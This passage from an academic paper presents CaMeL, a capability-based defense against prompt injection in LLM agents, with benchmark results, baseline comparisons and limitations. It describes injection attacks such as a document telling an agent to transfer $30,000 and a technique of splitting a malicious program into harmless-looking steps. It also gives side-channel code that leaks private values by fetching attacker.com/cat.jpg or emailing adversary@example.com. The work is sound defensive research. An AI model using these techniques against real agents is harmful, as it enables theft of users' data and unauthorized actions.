\textbf{The \pllm may not provide enough context to the \qllm.} The ``Not enough context for \qllm'' failure happens when the \pllm asks the \qllm to extract some data from a value, but the value does not contain this data. Although the \qllm can raise a \pythoninline{NotEnoughInformationError}, the \qllm cannot communicate to the \pllm which data is missing, as this could introduce a prompt injection vector. Here too we expect better models (or better prompting) to reduce such errors by better understanding from context where the \qllm's required information
resides.

\input{figures/tables/failure_modes_combined}

\subsubsection{Cheaper \qllm Models Have Little Impact on Utility}

As mentioned in \Cref{sec:design-llms}, the models powering the \pllm and the \qllm need not be the same: in fact, as the tasks assigned to the \qllm by the \pllm are usually relatively simple, we can use a cheaper, less powerful model as a backbone for the \qllm. We indeed observe that the drop in utility caused by using a cheaper \qllm is negligible: when using Claude 3.5 Haiku as \qllm in combination with Claude 4 Sonnet as \pllm, we observe a reduction in utility of about $1\%$ for an estimated $12\%$ reduction in cost for the median task. We observe a similar drop in utility when employing GPT 4.1 Nano as \qllm in combination with o4 Mini High.

\subsection{Security evaluation}
While the previous section focuses on benign performance of the system, in this section we turn to security evaluations. In particular, we break down the evaluation into three main case studies. First, we focus on the performance of the system under attack where no additional policies are involved, rather the system security is provided by the isolation principle first described by~\citet{willison2023dualllm}. Next, we turn to the security evaluation where additionally we install a number of security policies for various tasks. Here, they provide another level of guarantees that certain actions cannot be performed by the system. Finally, we discuss peculiar \sysname{}-specific attacks that we observed when running evaluations, which we discuss broadly in~\Cref{sec:discussion}.

\subsubsection{Case study: without any Security Policies}\label{subsec:eval-no-secpol}

\begin{figure}[ht]
	\centering
	\begin{subfigure}{.42\linewidth}
		\includegraphics[width=\linewidth]{results/utility-under-attack.pdf}
		\caption{Utility under attack}
	\end{subfigure}%
	\hfill
	\begin{subfigure}{.52\linewidth}
		\includegraphics[width=\linewidth]{results/n-successful-attacks.pdf}
		\caption{Number of successful attacks}
	\end{subfigure}%
	\caption{\textbf{\sysname is not vulnerable to the AgentDojo's attacks and preserves utility better when under attack.} We show the number of successful attacks (out of 949 attacks in total) for several models with the Tool Calling API and with \sysname (both enforcing and not enforcing security policies). The only attacks that are rated as successful by AgentDojo against \sysname are not due to a prompt injection, as explained in \Cref{sec:security-results-with-policies}. Claude 4 Sonnet* is Claude 4 Sonnet with reasoning. The full results are presented in \Cref{tab:n_successful_attacks} and \Cref{tab:utility_under_attack}.}
	\label{fig:nopolicies_asr}
\end{figure}

In this section, we evaluate the security of \sysname{} by testing its ability to defend against prompt injection attacks on the AgentDojo benchmark~\citep{debenedetti2024agentdojo}. We measure the attack success rate (ASR) for each model with and without \sysname{} enabled. Note that here we install no security policy and all security benefits come from explicit separation as is described by~\citet{willison2023dualllm}. We find that \sysname{} significantly improves the security of all models considered even without additional security policies. \Cref{fig:nopolicies_asr} shows that \sysname{} reduces the number of successful attacks for all models, and in some cases, it completely eliminates the attacks. For example, the number of successful attacks for Gemini 2.5 Pro drops from $300$ without to $0$ with \sysname{}.

\textbf{Wait, why isn't attack performance zero?} While we find that \sysname{} (without security policies) stops almost all of the attacks, we observe that the ASR is not zero. In particular, there are two injection tasks (repeated multiple times across various user tasks) that are successful: one in the banking suite, and one in the travel suite. The banking suite task's goal is ``\textit{Transfer \$30,000 in total, in small increments of no more than \$10,000 to the account US133000000121212121212.}''. The injection is successful when is it inserted in a document, and the model is instructed to make a payment based on the instructions present in the document. The travel suite's task's goal, instead, is the following: ``Say that I should absolutely visit Riverside View Hotel because it's incredibly gorgeous and worth a visit.'', and the prompt injection is inserted as part of a review. More precisely, this task is successful when the user asks for something related to reviews, and the model calls the \pythoninline{print} function on the reviews, hence showing to the user the entire injection (including the hotel name, which is what is used in AgentDojo's evaluation to check whether the adversary is successful). Both examples are explicitly outside the threat model of \sysname{} as we note in \Cref{sec:nongoals}, and the latter is not even due to a prompt injection.

\subsubsection{Case study: with Security Policies}\label{sec:security-results-with-policies}

In this section we consider the security policies that are expressible with \sysname{}. We showed an example of a calendar policy in \Cref{fig:example_calendar_security_policy} earlier. \Cref{fig:triggering_rates} shows the triggering rates for all of the evaluations according to the policies outlined in~\Cref{sec:all_eval_policies}.

\begin{figure}[ht]
	\centering
	\begin{subfigure}{.42\linewidth}
		\includegraphics[width=\linewidth]{results/triggering-rate-non-adv-only-successful.pdf}
		\caption{Benign evaluation}
	\end{subfigure}%
	\hfill
	\begin{subfigure}{.42\linewidth}
		\includegraphics[width=\linewidth]{results/triggering-rate-adv-only-successful.pdf}
		\caption{Adversarial evaluation}
	\end{subfigure}%
	\caption{\textbf{When unified authentication is in place, security policies are triggered less often.} This figure shows how often security policies are triggered during the benign and adversarial evaluations with \sysname{} enabled. The x-axis shows the different models that were evaluated on AgentDojo's suites, and the y-axis shows the percentage of tasks for which the security policies were triggered. The proportions are reported only over the successfully solved tasks; the workspace suite, where users are identified by their email address, has more granular security policies which get triggered less often. \Cref{fig:triggering_rates_all} reports the same for all tasks.}
	\label{fig:triggering_rates}
\end{figure}

\textbf{Wait, why isn't attack performance zero \emph{now}?} While we find that \sysname{} stops almost all of the attacks, we find that the number of successful attacks is not zero. The injection task that is successful in the travel suite is the same as the one mentioned in \Cref{subsec:eval-no-secpol}. While this attack (which is not due to a prompt injection) can't be prevented by our design, the fine-grained annotations maintained by the \sysname{} interpreter can be used to highlight in the user interface that the piece of text comes from an untrusted source. In particular, this is useful in prompt injection attacks that aim to phish the user, e.g., by impersonating someone urging the user to click on a link. This attack, as we note in \Cref{sec:nongoals}, is a non-goal for \sysname{}.

\textbf{How often do security policies get triggered?} We show in \Cref{fig:triggering_rates} for how many tasks security policies deny tool execution, i.e., how often users are asked for explicit consent before executing a given tool. We can see that, for the workspace suite, security policies deny tool execution a relatively small amount of times. This is thanks to the fact that the tool outputs in the workspace suite can be easily annotated (e.g., the set of people who can read the content of an email are the recipients of the email), and this allows for more granular security policies. Differently, in the Slack suite, policies deny execution much more often. This is because in the suite it is unclear from the suite specification what the user's account is (as opposed to the workspace suite), and because in many tasks data come from web pages (which are untrusted). The denial rate is also higher on the banking suite. This is because the security policy for the \pythoninline{send_money} tool is very strict and requires the recipient and the amounts of the payment to have the user as a source, as well as no other untrusted parent source in the dependency graph. Finally, the results for the travel suite are not particularly significant as models have low utility when running this suite, for the reasons explained above.

\subsection{Baseline comparisons}\label{sec:baselines}

\begin{figure}[ht]
	\centering
	\begin{subfigure}[b]{.49\textwidth}
		\centering
		\includegraphics[width=\linewidth]{results/defenses-utility.pdf}
		\caption{Utility, full results in \Cref{tab:defenses-utility}}
		\label{fig:defenses-utility}
	\end{subfigure}%
	\hfill
	\begin{subfigure}[b]{.49\textwidth}
		\centering
		\includegraphics[width=0.75\linewidth]{figures/results/n-successful-attacks-defenses.pdf}
		\caption{Number of successful attacks, full results in \Cref{tab:defenses_n_successful_attacks}}
		\label{fig:defenses-asr}
	\end{subfigure}
	\caption{\textbf{\sysname{}'s security guarantees in practice.} A comparison between \sysname{} and other defenses in terms of utility and number of successful attacks when using Claude 3.5 Sonnet. \sysname{} significantly outperforms all other defenses in terms of security while having a reasonable impact on utility (the latter with the exception of the Travel suite). This highlights the effectiveness of \sysname{}'s approach of using explicit isolation and formal security policies. The total number of attacks is $949$ and the y axis is symlog scale. In the left figure, only ``\sysname{}" is shown (and not ``\sysname (no policies)'' as policies do not affect utility. We also show the utility under attack in \Cref{fig:defenses-utility-attack}.}
	\label{fig:utility-and-defences}
\end{figure}

We compare \sysname{} with other defenses implemented in AgentDojo \citep{debenedetti2024agentdojo} run with Claude 3.5 Sonnet. These defenses are: tool filter~\citep{debenedetti2024agentdojo}, spotlighting~\citep{hines2024defending}, and prompt sandwiching~\citep{learnprompting2024sandwich}. The results are shown in \Cref{fig:utility-and-defences}.

We find that \sysname{} significantly outperforms all other defenses in terms of security. For example, the the number of successful attacks with \sysname{} is $0$, while the number of successful attacks with the next best defense (tool filter) is $8$. Notably, the defenses use a model (Claude 3.5 Sonnet) which is already not particularly vulnerable to AgentDojo's default prompt attack. However, \citet{usaisi2025aiagenthijackingevals} showed that, when attacked with adaptive prompts, the robustness of Claude 3.5 Sonnet drops drastically. This implies that the same might happen with the other defenses, which are heuristic and do not provide any guarantees.

Finally, we find that GPT-4o Mini, which uses the instruction hierarchy defense~\citep{wallace2024instruction,openai2024gpt4omini}, still fails to defend against all attacks in AgentDojo. While GPT-4o Mini with \sysname is not vulnerable to any of the attacks in AgentDojo, GPT-4o-mini with the tool calling API (which implements the instruction hierarchy by default) is vulnerable to 276 attacks.

This demonstrates that \sysname{}'s approach of using explicit isolation, fine-grained capabilities, and formal security policies is more effective than relying on learned  instruction hierarchy alone. Importantly, \sysname{} comes with security guarantees, while all other solutions currently are probabilistic and provide no such guarantees, relying on the agents to make all the important security decisions. Finally, \sysname{} can and should be used in conjunction with other defenses to deliver defense in depth.

\subsection{Case study: when data flow becomes control flow}
\label{sec:worstcase}

\begin{wrapfigure}{r}{0.6\linewidth}
	\vspace{-2em}
	\begin{center}
		\includegraphics[width=\linewidth]{figures/adv_flow_updated.pdf}
	\end{center}
	\caption{\textbf{Corrupting the data flow can potentially provide arbitrary code execution.} An attacker sends a query to the model, instructing it to monitor emails, identify an action within an email, and execute that action. This effectively turns data flow into control flow, as the instructions from the email now dictate the agent's actions and can in principle execute arbitrary commands, potentially issued by external adversary.}
	\label{fig:adv_flows}
	\vspace{-2em}
\end{wrapfigure}

We now turn to an example of a task that is not stoppable simply by using the isolation as is proposed by~\citet{willison2023dualllm}, necessitating policies and capabilities; importantly, this attack is applicable to other security systems as well. In this section we discuss a solution generated by Claude 3.5 Sonnet, o3-mini, and o1 that could be exploited by an adversary, representing a challenging scenario to protect against. The original responses of Claude 3.5 Sonnet, o3-mini are presented in \Cref{sec:control_flow_is_data_flow_with_agents}, but here we will use a simplified description. Note that we explicitly weaponized this example and it is different from the exact produced model solution. \Cref{fig:adv_flows} illustrates the setup.

\textbf{Initial Setup:} The user sends an initial query to the model, instructing it to monitor emails, identify an action within an email, and execute that action. Since data can influence choice of an action, both Claude and o3 generated a control flow graph, shown in \Cref{sec:control_flow_is_data_flow_with_agents}, that iterated through all possible tools and choosing one based on the email.

\textbf{Data Flow Becomes Control Flow:} The attacker can then send an email with malicious instructions. The model, following its generated code, executes these instructions. \textit{This effectively turns data into control flow, as the instructions from the email now dictate the model's actions.}

\textbf{Bypassing Defenses:} This attack is particularly dangerous because it bypasses traditional defenses that focus on monitoring the control flow. The malicious instructions are hidden within the data flow, making them harder to detect. What is more, in this setup it is possible to use attacks akin to~\citet{jones2024adversariesmisusecombinationssafe,glukhov2024breachthousandleaksunsafe}, where a malicious query is broken down into non-malicious sub-queries that together constitute a malicious response. Here, similar effect could be achieved by breaking a malicious program into a benign-looking set of small instructions -- since the model never sees all of the instructions at the same time, it cannot identify the intent of the overall query and detect that it is malicious.\footnote{This scenario is reminiscent of how polymorphic crypters were used in the past to hide malware. A crypter is a tool that encrypts malicious software to make it harder to detect by anti-virus software. The encrypted malware is sent to the victim bundled with a benign program, and when the program is executed, it step-by-step decrypts malware and runs the malicious code.}

\subsection{Overheads}

\begin{figure}[t]
	\centering
	\begin{subfigure}[b]{.49\textwidth}
		\centering
		\includegraphics[width=\linewidth]{figures/results/tokens_increase/input_tokens_increase-claude-3-5-sonnet-latest-camel-important_instructions.pdf}
		\caption{Input tokens usage increase.}
		\label{fig:increased-input-tokens-attack}
	\end{subfigure}%
	\hfill
	\begin{subfigure}[b]{.49\textwidth}
		\centering
		\includegraphics[width=\linewidth]{figures/results/tokens_increase/output_tokens_increase-claude-3-5-sonnet-latest-camel-important_instructions.pdf}
		\caption{Output token usage increase.}
		\label{fig:increased-output-tokens-attack}
	\end{subfigure}
	\caption{\textbf{\sysname requires only $2.82\times$ more input and $2.73\times$ more output tokens than native tool-calling, while providing security guarantees.} We measure the increase in token usage when using \sysname compared to native tool-calling, under attack, using Claude 3.5 Sonnet as backbone model. The red line represents the increase in token usage for the median task. Results when not under attack are in \Cref{fig:increased-tokens-no-attack}.}
	\label{fig:increased-tokens-attack}
\end{figure}

\sysname{} is designed to be lightweight and efficient, focusing on tracking data provenance and enforcing security policies without significant computational overhead and cognitive user load. The main latency overhead in code execution comes from maintaining the data flow graph, which tracks the origin and dependencies of each variable. This requires minimal processing and storage, as it only requires computing unions and storing metadata about the source and allowed readers for each value. The custom Python interpreter also introduces a small overhead, but it is negligible compared to the overall execution time of the LLM agent. However, because the code generated by the \pllm can cause errors, the \pllm might be queried multiple times to fix them. We measure, for each task, how many more input and output tokens are required by \sysname, compared to using the native tool-calling API with Claude 3.5 Sonnet as the backbone model. Because the tokenizer of the Claude family is not open-source, we tokenize using OpenAI's GPT-4o tokenizer in \pythoninline{tiktoken} library~\citep{tiktoken2022}.
Moreover, since the tokenization of the tool documentation provided to the model is unknown, we do not count such tokens. However, we still count all the tokens from the system prompt that describes the specification of \sysname's programming language. Overall, we find that \sysname requires $2.82\times$ input tokens and $2.73\times$ more output tokens for the median task in AgentDojo. We show the distribution of the increase in token usage of \sysname in \Cref{fig:increased-input-tokens-attack}. We report in \Cref{sec:extra-overhead} the increase in token usage, and total token usage for the baseline defenses presented in \Cref{sec:baselines}.
\sysname requires the highest token usage among the defenses we analyze, the best being Spotlighting, which uses $1.06\times$ more input and $0.98\times$ the output tokens. However, we believe that the cost of \sysname is reasonable considering its security guarantees. Moreover, as models become more capable, we expect them to follow the specifications of the Python subset more closely, requiring less tokens to fix coding errors.

\section{Side Channels Can Be a Problem}
\label{sec:side-channels}

We find that \sysname{} is vulnerable to side-channel attacks, where an attacker can infer sensitive information by observing the system's behavior with shared resources~\citep{anderson2002security}. Side-channel attacks are notoriously difficult to prevent completely, even in traditional software systems. While side-channels to a degree undermine the claim of strong security guarantees, we want to re-emphasise that \sysname{} significantly improves the status quo, provides isolation guarantees, and, in some cases, even allows one to reason about the said leakage due to fine-grained data tracking.

Here, we consider three explicit examples. In the first, we show how an adversary can leak a private variable to an external service through indirect dependency. In the second, we discuss a side channel that can reveal one bit of information via arbitrary exception triggering by the adversary. In the third, we discuss a timing side channel that can remove annotation from a private variable in the execution flow. We note that we believe that other types of side channels might be possible, and examples below should serve as a cautionary tale that even with \sysname{}, a system that makes attacks significantly harder, data can still be (inefficiently) mishandled by the agent.

\begin{figure}[H]
	\centering
	\begin{mintedbox}[autogobble,escapeinside=||]{python}
		# Variable that has a private value and has associated flow constraints
		|{\color{red}private\_variable}| = 10

		for i in range(|{\color{red}private\_variable}|):
		fetch_external_image("attacker.com/cat.jpg")

		### Attacker can count number of references
		### to cat.jpg from the same ip address
		### On the web server:
		SELECT COUNT(*) FROM access_logs WHERE ip_address =
		'<target_ip_address>' AND requested_resource = '/cat.jpg';
	\end{mintedbox}
	\caption{\textbf{Without \sysname's \pythoninline{STRICT} mode, private data can be leaked via tool calls that do not have a direct dependency on them.} Example showing how an resource can infer value of a private variable, despite not having a direct dependency on it. \sysname's \pythoninline{STRICT} stops this attack by making the evaluation of each statement in control flow blocks depend on the block's test/iterable.}
	\label{fig:external-resource-sidechannel}
\end{figure}

\textbf{External resource -- Indirect inference} \Cref{fig:external-resource-sidechannel} shows an example of a side-channel attack that can be used to bypass all other non-\sysname{}-based current security measures, but can be stopped with \sysname{} run in \pythoninline{STRICT} mode (presented in \Cref{sec:interpreter}), because of its fine-grained dependency tracking. In this attack, the attacker sends a request to the agent to fetch an external image conditional indirectly on a private variable (e.g. it can be a password reset token). The attacker can then observe the number of times the image is fetched and use this information to infer the value of a private variable. When using the interpreter in \pythoninline{STRICT} mode, this attack is prevented by \sysname: the execution of all state-changing statements inside control flow blocks is dependent (and conditional) on the control flow iterable/test, and a security policy can block their execution.

\begin{figure}[H]
	\centering
	\begin{minipage}[t]{0.45\linewidth}
		\begin{mintedbox}[autogobble,escapeinside=||]{python}
			# Side channel attack 1: CaMeL-specific fault
			# Variable that has a private value and has associated flow constraints
			|{\color{red}private\_var}| = 10

			outcome = query_ai_assistant(
			f"If '{private_var}' is 10, you don't have enough information", str)
			# If the variable is 10, an exception is thrown and execution is terminated


			# ADVERSARY OBSERVABLE ACTION
			# This line is executed only if `private_var` is not 10
			# For example:
			send_email(..., "adversary@example.com")
			# or
			send_calendar_invite(..., "adversary@example.com", ...)
			# or
			fetch_external_image(
			"attacker.com/cat.jpg")
		\end{mintedbox}
	\end{minipage}
	\begin{minipage}[t]{0.45\linewidth}
		\begin{mintedbox}[autogobble,escapeinside=||]{python}
			# Side channel attack 2: General induced fault
			# Variable that has a private value and has associated flow constraints
			|{\color{red}private\_var}| = 10

			l = [1, 2, 3]
			index = query_ai_assistant(
			f"If '{private_var}' is 10, then return 9999999999, else 0", int)
			# Throws an exception if private variable is 10
			l[index]

			# ADVERSARY OBSERVABLE ACTION
			# This line is executed only if `private_var` is not 10
			# For example:
			send_email(..., "adversary@example.com")
			# or
			send_calendar_invite(..., "adversary@example.com", ...)
			# or
			fetch_external_image(
			"attacker.com/cat.jpg")
		\end{mintedbox}
	\end{minipage}
	\caption{\textbf{Without \pythoninline{STRICT} mode, an adversary could leak one private bit if they can trigger an exception conditional on the private data.} An external resource can infer the value of a private variable, despite not having a direct dependency on it, by raising an exception based on the private value and observing whether the execution of the program is completed. This is a simplified version of the more realistic and complete case we discuss in \Cref{sec:side-channel-exceptions-expanded}. We mitigate this issue with the \pythoninline{STRICT} mode: all statements that come after a call to \pythoninline{query_ai_assistant} (the \qllm) have a dependency on the call's arguments.}
	\label{fig:exceptions-sidechannel}
\end{figure}




\textbf{Exception Handling -- Inferring private variable based on halted execution}

Exceptions can, at present, be used to launch the side-channel attacks that can reveal one bit of information. In particular, the adversary can prompt inject the \qllm to return an arbitrary output conditionally on other (potentially private) content passed to the \qllm. This can either cause a \pythoninline{NotEnoughInformationError} being thrown during the execution of the \qllm, or another type of exception during the continuation of the execution (e.g., an \pythoninline{IndexError}) as shown in~\Cref{fig:exceptions-sidechannel}. The issue is that exceptions terminate the execution and prevent the potential execution of tool calls observable by the adversary. As a consequence, if the adversary can observe the execution of a tool after the exception is expected to be thrown, then they can learn one bit of information about potentially private data. We discuss an expanded version of this case that can exploit code generated by Claude 3.5 Sonnet for an AgentDojo task in~\Cref{sec:side-channel-exceptions-expanded}.

We believe that, rather than being a limitation of \sysname, this is a limitation of using exceptions to handle errors. This issue could be addressed by using explicit error handling with conditionals and result types (such as \texttt{Result} in Rust or \texttt{Either} in Haskell) instead of exceptions. With this approach, both branches of the conditional would maintain dependencies on the operation's inputs, allowing state-changing tools to properly track these dependencies.

Similarly to the example above, in the current \sysname implementation, we mitigate this side-channel vulnerability with  \pythoninline{STRICT} mode: whenever there is a call to the \qllm (i.e., to the \texttt{query\_ai\_as\-sistant} function), we make the evaluation of all subsequent statements have a dependency on the inputs of the \qllm call. In this way, if the adversary manages to raise an arbitrary exception, and if a state-changing tool gets called after a call to the \qllm that had non-public variables as arguments, the execution is blocked and the user is prompted to confirm the execution. While this mitigation is effective against arbitrary exceptions caused by calls to the \qllm (and subsequent dependent operations, hence covering both cases in \Cref{fig:exceptions-sidechannel}), the adversary might still be able to raise arbitrary exceptions by manipulating the data accessed by tools. However, we expect this to be significantly more difficult than just prompt injecting the \qllm into raising an exception.

\begin{figure}[H]
	\centering
	\begin{mintedbox}[autogobble,escapeinside=||]{python}
		import time

		# Variable that has a private value and has associated flow constraints
		|{\color{red}private\_variable}| = 10

		before_time = time.time()
		time.sleep(|{\color{red}private\_variable}|)
		after_time = time.time()

		# Variable that has the private value but comes with no constraints
		|{\color{magenta}public\_variable}| = (after_time - before_time)
	\end{mintedbox}
	\caption{\textbf{Timing side-channels can reveal private data to an adversary.} Example of a timing side-channel that bypasses the constraints on a private variable. \sysname is not vulnerable to this specific attack as the \pythoninline{time} module is not available in the interpreter. However, we do not exclude that other timing side-channels could be present and exploitable.}
	\label{fig:timing-sidechannel}
\end{figure}
\textbf{Shared resource -- Time} We conclude with another example of a side-channel, in this case based on timing and probably harder to achieve. Here, an attacker might be able to deduce the contents of a private variable using access to current time as is shown in~\Cref{fig:timing-sidechannel}. To what extent timing side-channels are exploitable in practice depends on the specific deployment scenarios, the set of tools available to the agent, and whether the attacker is able to observe the side-channel with sufficient precision. For example, we note that the \pythoninline{time} module is not available in the current implementation of \sysname, so this specific attack would not be possible to carry out.

\section{Secondary attack scenarios that \sysname can help with}

We note that \sysname{} can also be used in threat models even stronger than the well-known prompt injection threat model, where compromise can come from the user, data, tooling, or any combination of the three.

\sysname{} can be used to stop rogue users and tools from violating security policy of the overall system (e.g., corporate security policies). Although this scenario receives little attention in the academic literature, it presents one of the biggest threats in an industrial setting. For example, in 2014 PwC attributed 44\% of all data compromises to insider threats~\citep{pwc}, while more recent Cost of Insider Threats Global Report finds that 50\% of insider compromises are due to negligence, while 26\% are malicious insiders~\citep{ponemon2022costofinsider}. Here we discuss two kinds of such insiders -- one is the compromised user who issues a command that violates underlying security policy; the other is the maliciously added tool to the system that aims to steal user data.

\begin{figure}[t]
	\centering
	\begin{subfigure}{.6\textwidth}
		\centering
		\includegraphics[height=0.25\textheight]{figures/threatmodeling/threat_model2.pdf}
		\caption{\textbf{Scenario 2.} Spy tool.}
		\label{fig:external_spy_tool}
	\end{subfigure}
	\begin{subfigure}{.39\textwidth}
		\centering
		\includegraphics[height=0.25\textheight]{figures/threatmodeling/threat_model3.pdf}
		\caption{\textbf{Scenario 3.} Rogue user.}
		\label{fig:rogue_user}
	\end{subfigure}
	\caption{\textbf{\sysname can help beyond prompt injections}. Here we present two additional scenarios where \sysname can be useful. In \textbf{Scenario 2} (\textit{left}) we consider a user who either maliciously or unknowingly installs a malicious tool that steals all data that is processed by the user. In this scenario security policy can be configured in a way that external tools cannot access internal information, which would protect against this attack vector. In \textbf{Scenario 3} (\textit{right}) we consider a compromised user who attempts to violate company policy by sending financial documents to an external address.  The user prompt is modified to include the attacker's email address, resulting in the exfiltration of private data. This scenario highlights the risk of malicious insiders or compromised user accounts.}
	\label{fig:extra-scenarios}
\end{figure}


\textbf{Scenario 2: External Spy Tool} The scenario in~\Cref{fig:external_spy_tool} focuses on the risk of unauthorized data access by externally installed tools. A malicious actor introduces a spy tool whose documentation prompt injects the agent in a way that the model would choose it (as demonstrated possible by~\citet{nestaas2025adversarial}) and would pass it all the data being observed by the agent. Similarly to a keylogger or screen scraper (but within ML context), the tool passively monitors and exfiltrates data processed by the agent, including sensitive private information. The attack could be intentional, with a user knowingly installing a malicious tool, or unintentional, with the user unknowingly installing compromised software. This scenario illustrates a control flow-based adversary and is not explicitly addressed in AgentDojo.

\textbf{Scenario 3: Rogue User} The scenario in~\Cref{fig:rogue_user} addresses the threat posed by malicious insiders or compromised user accounts. A user with legitimate access to the Agent intentionally misuses the system to violate security policies. In this example, the user modifies a prompt to include an external email address, attempting to send confidential financial documents outside the organization. This scenario illustrates a stronger adversary that can manipulate the control and data flows and is not explicitly addressed in AgentDojo~\citep{debenedetti2024agentdojo}.

The threat models described above are extremely realistic and mimic the everyday security considerations of a large agent-based system that are in production today. The complexity of these threats and the limitlessness of expected agentic functionality inspired the design of~\sysname{}. To the best of our knowledge, using capabilities for agents has not previously been considered, and we find that it provides strong security guarantees that current capability-less systems do not.

\section{Discussion}
\label{sec:discussion}

While \sysname{} offers robustness to prompt injection attacks, it has several potential limitations that would be shared with any other capability-based protection scheme.
In this section we first discuss how, just like our defense comes from ideas from the security literature, we can evade the defense by leveraging \emph{attacks} from the security literature. Second, we discuss the challenges of balancing security with user experience, particularly in the context of de-classification and user fatigue. Third, we discuss how side-channels can be difficult to overcome for~\sysname{} and other systems built on similar principles.

\subsection{Past problems with adoption of capabilities}

While capability-based systems offer a robust security model, it is important to acknowledge their limitations, particularly concerning their broader applicability, implementation, and adoption challenges.

One drawback is the high cost of implementation. Building a capability-based system requires significant effort and resources, as it requires a fundamental shift in how security is managed and enforced. This includes not just the development of the core system but also the integration and adaptation of existing tools and infrastructure. CHERI serves as a good case study~\citep{watson2015cheri}, where incorporation of capabilities required a redesign of the full software-hardware stack~\citep{zaliva2024formalsemantics}, changes to development practices (e.g. with compartmentalization of code~\citep{gudka2015compartments}) as well as significant effort to raise awareness of the benefits~\citep{adoption}.

Furthermore, capability-based systems ideally require full participation from the entire ecosystem. For the model to effectively enforce security policies, all external tools and services within the environment must be designed to understand and utilize capabilities, otherwise utility degrades. This can be a major obstacle, especially when dealing with third-party tools or services that may not have been built with capability-based security in mind.

Having said that, in the context of agents operating within a controlled environment like workspace, implementing a capability-based system may be feasible as long as all the tools and services are under the control of the system developers. However, as soon as the agent needs to interact with external, third-party tools, the challenge of ensuring capability support arises. So grow the risks from side-channel attacks as we discuss further. Yet we believe that in some cases, it may be possible to use capability-based systems even if third-party tools do not support capabilities. This is because the agent can act as a central authority that manages capabilities for all objects in the system.


\subsection{De-classification and user fatigue}

Another challenge lies in balancing security with user experience. While \sysname{} can prevent many prompt injection attacks, it may also require user intervention in situations where the security policy is too restrictive or ambiguous. Access control problems often manifest in the process of de-classification process or ``downgrading''~\citep{anderson2002security}. This can lead to user fatigue, where users become desensitized to security prompts and may inadvertently approve malicious actions, a practice that is often seen in other settings~\citep{felt2012androidpermissions,cao2021alargescalestudy}. Achieving the optimal balance between system security and minimizing user fatigue will vary depending on the specific application. Ultimately, however, it's paramount for enabling effective security. In the end, security will only be as strong as the capabilities the system supports, and the policies that the system implements and enforces.

\subsection{So, Are Prompt Injections Solved Now?}

\textbf{No, prompt injection attacks are not fully solved.} While \sysname{} significantly improves the security of LLM agents against prompt injection attacks and allows for fine-grained policy enforcement, it is not without limitations. Importantly, \sysname{} suffers from users needing to codify and specify security policies and maintain them. \sysname{} also comes with a user burden. At the same time, it is well known that balancing security with user experience, especially with de-classification and user fatigue, is challenging. We also explicitly acknowledge the potential for side-channel vulnerabilities in \sysname{}; however, we do note that their successful exploitation is significantly hindered by bandwidth limitations and the involved attack complexity.

Similarly, in traditional software security, Control Flow Integrity (CFI)~\citep{abadi2009control} was developed to prevent control flow hijacking but remained vulnerable to return-oriented programming (ROP) attacks~\citep{schacham2007rop,carlini2014rop}. ROP is an exploitation technique where attackers chain together existing code fragments (called "gadgets") to execute malicious operations while following individually valid control flows. We suspect attacks that are similar in spirit could work against \sysname{} -- an attacker might be able to create a malicious control flow by approximating it with the smaller control flow blocks that are allowed by the security policy similar to what we demonstrate in~\Cref{sec:worstcase}.

\textbf{And is AgentDojo fully solved now? Not exactly.} While \sysname{} offers robust security guarantees and demonstrates resilience against existing prompt injection attacks within AgentDojo benchmark, it would be inaccurate to claim a complete resolution. Rather, our approach diverges from prior efforts, focusing on building model scaffolding rather than improving the model. Furthermore, existing research predominantly aims to optimize utility while mitigating attack success rates. In contrast, our focus is on establishing verifiable security guarantees while concurrently maximizing utility. We firmly believe that by adopting \sysname{} as a fundamental design paradigm, future research will unlock substantial enhancements in utility.

\section{Future work}

\sysname makes a significant step forward in providing security for LLM agents. However, there is some further work that can be done to improve both security and utility.

\textbf{Using a different programming language.} While basic features of Python are easy to implement, especially when using Python as the host language for the interpreter, this language quickly grows very complex and harder to make secure. For example, program termination caused by exceptions can be a security issue, as pointed out in~\Cref{sec:side-channels}. Programming languages that handle errors and I/O more explicitly, such as Haskell, might be a more secure choice for deploying \sysname to real-world applications. This complexity also has ramifications for security policies, since policy conflict resolution becomes hard to manage.

\textbf{Towards formal verification.} A crucial direction for future work is the formal verification of \sysname{} and its security properties. While our current implementation provides strong empirical evidence of \sysname{}'s effectiveness in both benign and security LLM evaluations, verification can provide a formal proof that \sysname{}'s interpreter itself is without faults and that it resolves conflicts and enforces the intended security policies, even in the presence of complex code and potential vulnerabilities in the underlying LLMs.

\textbf{Contextual integrity and security policy automation.} The effectiveness of \sysname{} also depends on the availability of sufficient context for making security decisions. In some cases, the system may not have enough information to determine whether a particular action is safe, requiring user intervention. To address this, \sysname{} can potentially integrate with contextual integrity tools like AirGap~\citep{bagdasaryan2024air,ghalebikesabi2024operationalizing}, which can automate aspects of security policy enforcement based on context-specific policies; however this might come with some degradation in either security or model utility. \sysname{} can also potentially be integrated with concurrent work by \citet{shi2025progent}, who use a DSL for security policies and leverage LLMs to generate them.

\section{Conclusion}

\sysname{} is a practical defense to prompt injection achieving security not through model training techniques but through principled system design around language models. Our approach effectively solves the AgentDojo benchmark while providing strong guarantees against unintended actions and data exfiltration.

Our approach is not perfect and does not completely address every potential attack vector.
We know this because we have chosen to \emph{design} a defense, instead of hoping that the defense will be learned from data.
This makes it possible to precisely study the interaction between the defense components and reuse past experience from software security to reason about potential vulnerabilities.
In future work we hope to develop methods that further address limitations of the current design.

Importantly, \sysname{} remains compatible with other defenses that make the language model itself more robust.
Even if someone were to develop a technique that significantly enhanced a model's robustness to prompt injection, it would still be possible to obtain a stronger security argument through combining it with~\sysname{}.

Broadly we believe that ``security engineering'' mindset will be useful to areas of language model security beyond just prompt injection.
While it would be clearly preferable to have a single robust model that was able to address the many safety and security requirements of modern models in all possible settings, achieving this may not be immediately practical.
Instead, we have shown that it is possible to design a system around an untrusted model that makes the whole system robust even if the model itself is not.
We see potential for similar approaches to be taken to other areas, and hope that future work will continue in this direction.


\section*{Acknowledgements}
We want to thank Sharon Lin for technical feedback. We also want to thank Daniel Ramage, Octavian Suciu, Sahra Ghalebikesabi, Borja Balle, Lily Tsai, Eugene Bagdasarian, Jacint Szabo, Vijay Bolina, Harsh Chaudhari, Santiago Diaz, Javier Rando, Yury Kartynnik for engagement during project development. F.T. acknowledges the support of Schmidt Sciences.

\section*{Contributions}
